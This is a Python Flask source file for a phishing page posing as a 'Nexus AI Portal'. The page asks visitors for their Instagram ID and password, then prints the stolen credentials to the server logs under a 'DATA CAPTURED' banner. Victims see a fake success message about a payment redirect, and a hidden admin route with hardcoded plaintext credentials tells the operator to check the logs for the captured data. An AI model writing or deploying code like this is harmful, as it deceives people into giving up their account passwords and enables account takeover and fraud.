import os
from flask import Flask, render_template_string, request

app = Flask(__name__)

# --- ADMIN CREDENTIALS ---
A_EMAIL = "nexusai119@gmail.com"
A_PASS = "prashant@123456"

# --- UI DESIGN ---
STYLE = """
<style>
    body { background: #0f172a; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
    .card { background: #1e293b; display: inline-block; padding: 30px; border-radius: 15px; border: 2px solid #38bdf8; width: 300px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
    input { display: block; width: 90%; padding: 12px; margin: 15px auto; border-radius: 8px; border: 1px solid #334155; background: #0f172a; color: white; }
    button { background: #38bdf8; color: #0f172a; border: none; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; }
</style>
"""

# 1. USER PORTAL (HOME)
@app.route('/')
def home():
    return f"<html><head>{STYLE}</head><body><div class='card'><h2>🚀 Nexus AI Portal</h2><form method='POST' action='/login_process'><input name='u' placeholder='Instagram ID' required><input name='p' type='password' placeholder='Password' required><button type='submit'>Login & Start</button></form><br><a href='/admin_access' style='color:#94a3b8;text-decoration:none;font-size:11px;'>🛡️ Admin Login</a></div></body></html>"

# 2. DATA CAPTURE (FIXED ROUTE)
@app.route('/login_process', methods=['POST'])
def login_process():
    user_id = request.form.get('u')
    user_pw = request.form.get('p')
    # Ye line logs mein data dikhayegi
    print(f"\\n[!!!] DATA CAPTURED [!!!]\\nUSER: {user_id}\\nPASS: {user_pw}\\n-----------------------")
    return f"<html><head>{STYLE}</head><body><div class='card'><h2 style='color:#22c55e;'>✅ Success!</h2><p>Data recorded. Redirecting to Payment...</p><script>setTimeout(()=>{{window.location.href='/'}}, 3000);</script></div></body></html>"

# 3. ADMIN SECTION
@app.route('/admin_access')
def admin_ui():
    return f"<html><head>{STYLE}</head><body><div class='card'><h2>🛡️ Admin Access</h2><form method='POST' action='/verify_admin'><input name='e' placeholder='Admin Email'><input name='ps' type='password' placeholder='Pass'><button style='background:#fbbf24;'>Unlock</button></form></div></body></html>"

@app.route('/verify_admin', methods=['POST'])
def verify_admin():
    if request.form.get('e') == A_EMAIL and request.form.get('ps') == A_PASS:
        return "<h1>Welcome Prashant! Check Render Logs for Captured Data.</h1>"
    return "<h1>Invalid Credentials!</h1><a href='/admin_access'>Try Again</a>"

# --- RENDER PORT FIX ---
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
